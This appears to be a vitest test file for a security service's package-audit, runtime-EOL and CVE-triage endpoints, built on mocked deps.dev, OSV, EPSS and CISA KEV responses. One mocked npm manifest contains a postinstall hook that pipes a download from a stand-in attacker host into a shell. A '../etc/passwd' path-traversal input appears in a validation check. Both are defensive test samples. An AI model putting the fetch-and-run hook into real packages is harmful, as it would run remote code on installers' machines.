import { Hono } from "hono";
import { describe, expect, it } from "vitest";
import { BoundedTtlCache } from "../src/lib/cache";
import { createCveTriageHandler } from "../src/packs/security/routes/cveTriage";
import { createPackageAuditHandler } from "../src/packs/security/routes/packageAudit";
import { createRuntimeEolHandler } from "../src/packs/security/routes/runtimeEol";
import type { AppBindings } from "../src/types";

describe("security pack — package-audit, runtime-eol, and cve-triage", () => {
  it("audits npm, PyPI (OSV 'PyPI' + sdist_only_warning), and Cargo (OSV 'crates.io') packages with fail-closed 502 and 404/400 guards", async () => {
    const osvBodies: Array<Record<string, unknown>> = [];

    const mockFetch: typeof fetch = async (input, init) => {
      const url = String(input);

      if (url.includes("api.deps.dev/v3/systems/npm/packages/missing-pkg")) {
        return new Response("not found", { status: 404 });
      }
      if (url.includes("api.deps.dev/v3/systems/npm/packages/sketchy-js") && !url.includes("/versions/")) {
        return new Response(
          JSON.stringify({
            packageKey: { system: "NPM", name: "sketchy-js" },
            versions: [
              {
                versionKey: { system: "NPM", name: "sketchy-js", version: "0.0.1" },
                publishedAt: "2026-11-25T12:00:00Z",
                isDefault: true,
              },
            ],
          }),
          { status: 200 }
        );
      }
      if (url.includes("api.deps.dev/v3/systems/npm/packages/sketchy-js/versions/0.0.1")) {
        return new Response(
          JSON.stringify({
            versionKey: { system: "NPM", name: "sketchy-js", version: "0.0.1" },
            publishedAt: "2026-11-25T12:00:00Z",
            isDeprecated: false,
            licenses: [],
            links: [{ label: "SOURCE_REPO", url: "https://github.com/evil/sketchy-js" }],
            slsaProvenances: [],
          }),
          { status: 200 }
        );
      }
      if (url.includes("api.deps.dev/v3/projects/github.com%2Fevil%2Fsketchy-js")) {
        return new Response(
          JSON.stringify({
            starsCount: 2,
            ossFuzz: false,
            scorecard: { overallScore: 2.1 },
          }),
          { status: 200 }
        );
      }
      if (url.includes("registry.npmjs.org/sketchy-js/0.0.1")) {
        return new Response(
          JSON.stringify({
            name: "sketchy-js",
            version: "0.0.1",
            scripts: { postinstall: "curl -s https://evil.example/payload | sh" },
          }),
          { status: 200 }
        );
      }
      if (url.includes("api.deps.dev/v3/systems/pypi/packages/old-sdist") && !url.includes("/versions/")) {
        return new Response(
          JSON.stringify({
            packageKey: { system: "PYPI", name: "old-sdist" },
            versions: [
              {
                versionKey: { system: "PYPI", name: "old-sdist", version: "1.2.0" },
                publishedAt: "2022-01-01T00:00:00Z",
                isDefault: true,
              },
            ],
          }),
          { status: 200 }
        );
      }
      if (url.includes("api.deps.dev/v3/systems/pypi/packages/old-sdist/versions/1.2.0")) {
        return new Response(
          JSON.stringify({
            versionKey: { system: "PYPI", name: "old-sdist", version: "1.2.0" },
            publishedAt: "2022-01-01T00:00:00Z",
            isDeprecated: false,
            licenses: ["MIT"],
            links: [],
            slsaProvenances: [{ sourceRepository: "https://github.com/org/old-sdist" }],
          }),
          { status: 200 }
        );
      }
      if (url.includes("pypi.org/pypi/old-sdist/1.2.0/json")) {
        return new Response(
          JSON.stringify({
            info: { yanked: false },
            urls: [{ packagetype: "sdist" }],
          }),
          { status: 200 }
        );
      }
      if (url === "https://api.osv.dev/v1/query") {
        const parsed = JSON.parse(String(init?.body ?? "{}")) as Record<string, unknown>;
        osvBodies.push(parsed);
        const pkgObj = parsed.package as { name?: string } | undefined;
        if (pkgObj?.name === "sketchy-js") {
          return new Response(
            JSON.stringify({
              vulns: [
                {
                  id: "MAL-2026-9999",
                  database_specific: { severity: "CRITICAL" },
                  affected: [{ ranges: [{ events: [{ introduced: "0" }, { fixed: "0.0.2" }] }] }],
                },
              ],
            }),
            { status: 200 }
          );
        }
        if (pkgObj?.name === "old-sdist") {
          // PYSEC advisory with CVSS v3 vector only (no database_specific.severity)
          return new Response(
            JSON.stringify({
              vulns: [
                {
                  id: "PYSEC-2025-42",
                  severity: [
                    {
                      type: "CVSS_V3",
                      score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    },
                  ],
                  affected: [{ ranges: [{ events: [{ introduced: "0" }, { fixed: "1.2.1" }] }] }],
                },
              ],
            }),
            { status: 200 }
          );
        }
        return new Response(JSON.stringify({}), { status: 200 });
      }
      if (
        url.includes("/versions/default") ||
        url.includes("registry.npmjs.org/sketchy-js/default")
      ) {
        return new Response("not found", { status: 404 });
      }
      return new Response("unexpected", { status: 500 });
    };

    const app = new Hono<AppBindings>();
    app.get(
      "/v1/oss/package-audit",
      createPackageAuditHandler({
        cache: new BoundedTtlCache(20),
        fetchImpl: mockFetch,
        nowMs: () => Date.parse("2026-11-26T12:00:00Z"),
      })
    );

    // 400 validation (missing, path traversal, bad ecosystem)
    expect((await app.request("http://localhost/v1/oss/package-audit")).status).toBe(400);
    expect(
      (await app.request("http://localhost/v1/oss/package-audit?package=../etc/passwd")).status
    ).toBe(400);
    expect(
      (await app.request("http://localhost/v1/oss/package-audit?package=lodash&ecosystem=rubygems"))
        .status
    ).toBe(400);

    // 404 non-existent package (unsettled)
    expect(
      (await app.request("http://localhost/v1/oss/package-audit?package=missing-pkg")).status
    ).toBe(404);

    // 200 high-risk npm package (new package + postinstall hook + MALware advisory + low Scorecard)
    const npmRes = await app.request("http://localhost/v1/oss/package-audit?package=sketchy-js");
    expect(npmRes.status).toBe(200);
    const npmJson = (await npmRes.json()) as {
      risk_score: number;
      risk_tier: string;
      flags: string[];
      vulnerabilities: { total_count: number; critical_or_high_count: number };
      supply_chain: {
        package_age_days: number;
        has_install_scripts: boolean;
        install_script_hooks: string[];
        openssf_scorecard: { overall_score: number } | null;
      };
    };
    expect(npmJson.risk_tier).toBe("CRITICAL");
    expect(npmJson.risk_score).toBeGreaterThanOrEqual(75);
    expect(npmJson.flags).toContain("INSTALL_SCRIPT_HOOKS");
    expect(npmJson.flags).toContain("NEW_PACKAGE_UNDER_30D");
    expect(npmJson.flags).toContain("KNOWN_VULNERABILITIES");
    expect(npmJson.vulnerabilities.total_count).toBe(1);
    expect(npmJson.supply_chain.has_install_scripts).toBe(true);
    expect(npmJson.supply_chain.install_script_hooks).toEqual(["postinstall"]);
    expect(npmJson.supply_chain.package_age_days).toBe(1);
    expect(npmJson.supply_chain.openssf_scorecard?.overall_score).toBe(2.1);

    // 200 PyPI package maps ecosystem='pip' alias -> pypi and sends OSV ecosystem 'PyPI' + flags SDIST_ONLY_NO_WHEEL
    const pypiRes = await app.request(
      "http://localhost/v1/oss/package-audit?package=old-sdist&ecosystem=pip"
    );
    expect(pypiRes.status).toBe(200);
    const pypiJson = (await pypiRes.json()) as {
      ecosystem: string;
      flags: string[];
      vulnerabilities: { total_count: number; critical_or_high_count: number };
      supply_chain: { sdist_only_warning: boolean; has_slsa_provenance: boolean };
    };
    expect(pypiJson.ecosystem).toBe("pypi");
    expect(pypiJson.vulnerabilities.total_count).toBe(1);
    expect(pypiJson.vulnerabilities.critical_or_high_count).toBe(1);
    expect(pypiJson.supply_chain.sdist_only_warning).toBe(true);
    expect(pypiJson.supply_chain.has_slsa_provenance).toBe(true);
    expect(pypiJson.flags).toContain("SDIST_ONLY_NO_WHEEL");
    expect(osvBodies[1]?.package).toEqual({ name: "old-sdist", ecosystem: "PyPI" });

    // Explicit ?version=default must NOT collide with cached unversioned default lookup
    expect(
      (
        await app.request(
          "http://localhost/v1/oss/package-audit?package=sketchy-js&version=default"
        )
      ).status
    ).toBe(404);

    // Malformed deps.dev 200 {} (missing versions array) must fail closed with 502 (not 404)
    const badDepsApp = new Hono<AppBindings>();
    badDepsApp.get(
      "/v1/oss/package-audit",
      createPackageAuditHandler({
        cache: new BoundedTtlCache(10),
        fetchImpl: async () => new Response(JSON.stringify({}), { status: 200 }),
      })
    );
    expect(
      (await badDepsApp.request("http://localhost/v1/oss/package-audit?package=lodash")).status
    ).toBe(502);

    // 502 fail-closed if OSV fails (never report missing vulnerability check as safe!)
    const osvDownApp = new Hono<AppBindings>();
    osvDownApp.get(
      "/v1/oss/package-audit",
      createPackageAuditHandler({
        cache: new BoundedTtlCache(10),
        fetchImpl: async (input) => {
          const url = String(input);
          if (url.includes("api.osv.dev")) return new Response("down", { status: 503 });
          return mockFetch(input);
        },
      })
    );
    expect(
      (await osvDownApp.request("http://localhost/v1/oss/package-audit?package=sketchy-js")).status
    ).toBe(502);
  });

  it("verifies runtime EOL status, alias normalization (node -> nodejs), prefix matching (20.11.1 -> 20), 404, and 502", async () => {
    const eolFetch: typeof fetch = async (input) => {
      const url = String(input);
      if (url.includes("/products/unknown-runtime/")) {
        return new Response("not found", { status: 404 });
      }
      if (url.includes("/products/nodejs/")) {
        return new Response(
          JSON.stringify({
            result: {
              name: "nodejs",
              label: "Node.js",
              category: "framework",
              releases: [
                {
                  name: "24",
                  label: "24 (LTS)",
                  releaseDate: "2025-04-22",
                  isLts: true,
                  isEoas: false,
                  eoasFrom: "2026-10-20",
                  isEol: false,
                  eolFrom: "2028-04-30",
                  isMaintained: true,
                  latest: { name: "24.11.0", date: "2026-11-10" },
                },
                {
                  name: "18",
                  label: "18 (LTS)",
                  releaseDate: "2022-04-19",
                  isLts: true,
                  isEoas: true,
                  eoasFrom: "2023-10-18",
                  isEol: true,
                  eolFrom: "2025-04-30",
                  isMaintained: false,
                  latest: { name: "18.20.8", date: "2025-03-27" },
                },
              ],
            },
          }),
          { status: 200 }
        );
      }
      return new Response("err", { status: 502 });
    };

    const app = new Hono<AppBindings>();
    app.get(
      "/v1/oss/runtime-eol",
      createRuntimeEolHandler({
        cache: new BoundedTtlCache(10),
        fetchImpl: eolFetch,
        nowMs: () => Date.parse("2026-11-26T00:00:00Z"),
      })
    );

    expect((await app.request("http://localhost/v1/oss/runtime-eol")).status).toBe(400);
    expect(
      (await app.request("http://localhost/v1/oss/runtime-eol?product=unknown-runtime")).status
    ).toBe(404);
    expect(
      (await app.request("http://localhost/v1/oss/runtime-eol?product=node&cycle=99")).status
    ).toBe(404);

    // Alias 'node' -> 'nodejs' and semver '18.20.4' -> cycle '18' (EOL) with recommended_lts '24'
    const res = await app.request("http://localhost/v1/oss/runtime-eol?product=node&cycle=18.20.4");
    expect(res.status).toBe(200);
    const json = (await res.json()) as {
      product: string;
      matched_cycle: { cycle: string; is_eol: boolean; status: string; days_until_eol: number };
      recommended_lts: { cycle: string };
    };
    expect(json.product).toBe("nodejs");
    expect(json.matched_cycle.cycle).toBe("18");
    expect(json.matched_cycle.is_eol).toBe(true);
    expect(json.matched_cycle.status).toBe("EOL");
    expect(json.matched_cycle.days_until_eol).toBeLessThan(0);
    expect(json.recommended_lts.cycle).toBe("24");
  });

  it("triages CVEs combining OSV, FIRST EPSS, and slimmed CISA KEV with fail-closed 502 and 404", async () => {
    const cveFetch: typeof fetch = async (input) => {
      const url = String(input);
      if (url.includes("api.osv.dev/v1/vulns/CVE-2099-9999")) {
        return new Response("not found", { status: 404 });
      }
      if (url.includes("cveawg.mitre.org/api/cve/CVE-2099-9999")) {
        return new Response("not found", { status: 404 });
      }
      if (url.includes("api.osv.dev/v1/vulns/CVE-2024-3400")) {
        // Closed-source appliance CVE (not in OSV, present in MITRE + CISA KEV + EPSS)
        return new Response("not found", { status: 404 });
      }
      if (url.includes("cveawg.mitre.org/api/cve/CVE-2024-3400")) {
        return new Response(
          JSON.stringify({
            dataType: "CVE_RECORD",
            cveMetadata: {
              cveId: "CVE-2024-3400",
              state: "PUBLISHED",
              datePublished: "2024-04-12T07:20:00Z",
              dateUpdated: "2025-10-21T23:05:00Z",
            },
            containers: {
              cna: {
                descriptions: [
                  { lang: "en", value: "Command injection in Palo Alto Networks PAN-OS GlobalProtect." },
                ],
                metrics: [
                  {
                    cvssV3_1: {
                      vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                      baseSeverity: "CRITICAL",
                    },
                  },
                ],
                problemTypes: [{ descriptions: [{ cweId: "CWE-77" }] }],
                affected: [
                  {
                    vendor: "Palo Alto Networks",
                    product: "PAN-OS",
                    versions: [{ lessThan: "10.2.9-h1", status: "affected" }],
                  },
                ],
              },
            },
          }),
          { status: 200 }
        );
      }
      if (url.includes("api.osv.dev/v1/vulns/CVE-2024-3094")) {
        return new Response(
          JSON.stringify({
            id: "CVE-2024-3094",
            summary: "Malicious backdoor in xz-utils",
            published: "2024-03-29T00:00:00Z",
            modified: "2026-01-15T00:00:00Z",
            aliases: ["GHSA-rxwq-x6h5-x525"],
            severity: [{ type: "CVSS_V3", score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H" }],
            database_specific: { severity: "CRITICAL", cwe_ids: ["CWE-506"] },
            affected: [
              {
                package: { ecosystem: "Debian:12", name: "xz-utils" },
                ranges: [{ type: "ECOSYSTEM", events: [{ introduced: "0" }, { fixed: "5.6.1-1" }] }],
              },
            ],
          }),
          { status: 200 }
        );
      }
      if (url.includes("api.first.org/data/v1/epss")) {
        if (url.includes("CVE-2024-3400")) {
          return new Response(
            JSON.stringify({
              status: "OK",
              data: [{ cve: "CVE-2024-3400", epss: "0.94340", percentile: "0.99970" }],
            }),
            { status: 200 }
          );
        }
        return new Response(
          JSON.stringify({
            status: "OK",
            data: [{ cve: "CVE-2024-3094", epss: "0.84210", percentile: "0.99850" }],
          }),
          { status: 200 }
        );
      }
      if (url.includes("known_exploited_vulnerabilities.json")) {
        return new Response(
          JSON.stringify({
            vulnerabilities: [
              {
                cveID: "CVE-2024-3094",
                vendorProject: "Tukaani",
                product: "XZ Utils",
                dateAdded: "2024-03-29",
                dueDate: "2024-04-19",
                knownRansomwareCampaignUse: "Unknown",
                cwes: ["CWE-506"],
              },
              {
                cveID: "CVE-2024-3400",
                vendorProject: "Palo Alto Networks",
                product: "PAN-OS",
                dateAdded: "2024-04-12",
                dueDate: "2024-04-19",
                knownRansomwareCampaignUse: "Known",
                cwes: ["CWE-77"],
              },
            ],
          }),
          { status: 200 }
        );
      }
      return new Response("err", { status: 500 });
    };

    const app = new Hono<AppBindings>();
    const cache = new BoundedTtlCache(20);
    app.get("/v1/sec/cve-triage", createCveTriageHandler({ cache, kevCache: cache, fetchImpl: cveFetch }));

    expect((await app.request("http://localhost/v1/sec/cve-triage?cve=not-a-cve")).status).toBe(400);
    expect((await app.request("http://localhost/v1/sec/cve-triage?cve=CVE-2099-9999")).status).toBe(
      404
    );

    const okRes = await app.request("http://localhost/v1/sec/cve-triage?cve=cve-2024-3094");
    expect(okRes.status).toBe(200);
    const body = (await okRes.json()) as {
      cve: string;
      urgency_tier: string;
      priority_score: number;
      exploitation: { in_cisa_kev: boolean; epss_30d_probability: number };
      remediation: { fix_available: boolean; affected_packages: Array<{ fixed_versions: string[] }> };
    };
    expect(body.cve).toBe("CVE-2024-3094");
    expect(body.urgency_tier).toBe("ACT_IMMEDIATELY");
    expect(body.priority_score).toBeGreaterThanOrEqual(90);
    expect(body.exploitation.in_cisa_kev).toBe(true);
    expect(body.exploitation.epss_30d_probability).toBeCloseTo(0.8421, 4);
    expect(body.remediation.fix_available).toBe(true);
    expect(body.remediation.affected_packages[0]?.fixed_versions).toEqual(["5.6.1-1"]);

    // Closed-source CISA KEV CVE (404 on OSV, 200 on MITRE CVE 5.1) -> 200 ACT_IMMEDIATELY
    const panRes = await app.request("http://localhost/v1/sec/cve-triage?cve=CVE-2024-3400");
    expect(panRes.status).toBe(200);
    const panBody = (await panRes.json()) as {
      urgency_tier: string;
      exploitation: { in_cisa_kev: boolean };
      remediation: { fix_available: boolean };
      metadata: { sources: string[] };
    };
    expect(panBody.urgency_tier).toBe("ACT_IMMEDIATELY");
    expect(panBody.exploitation.in_cisa_kev).toBe(true);
    expect(panBody.remediation.fix_available).toBe(true);
    expect(panBody.metadata.sources).toEqual(["mitre_cve", "first_epss", "cisa_kev"]);

    // Malformed EPSS payload missing data[] must fail closed with 502
    const badEpssApp = new Hono<AppBindings>();
    badEpssApp.get(
      "/v1/sec/cve-triage",
      createCveTriageHandler({
        cache: new BoundedTtlCache(10),
        kevCache: new BoundedTtlCache(10),
        fetchImpl: async (input) => {
          if (String(input).includes("api.first.org")) {
            return new Response(JSON.stringify({ status: "ERROR" }), { status: 200 });
          }
          return cveFetch(input);
        },
      })
    );
    expect(
      (await badEpssApp.request("http://localhost/v1/sec/cve-triage?cve=CVE-2024-3094")).status
    ).toBe(502);

    // Fail-closed 502 if CISA KEV fails
    const kevDownApp = new Hono<AppBindings>();
    kevDownApp.get(
      "/v1/sec/cve-triage",
      createCveTriageHandler({
        cache: new BoundedTtlCache(10),
        kevCache: new BoundedTtlCache(10),
        fetchImpl: async (input) => {
          if (String(input).includes("known_exploited_vulnerabilities.json")) {
            return new Response("err", { status: 503 });
          }
          return cveFetch(input);
        },
      })
    );
    expect(
      (await kevDownApp.request("http://localhost/v1/sec/cve-triage?cve=CVE-2024-3094")).status
    ).toBe(502);
  });
});
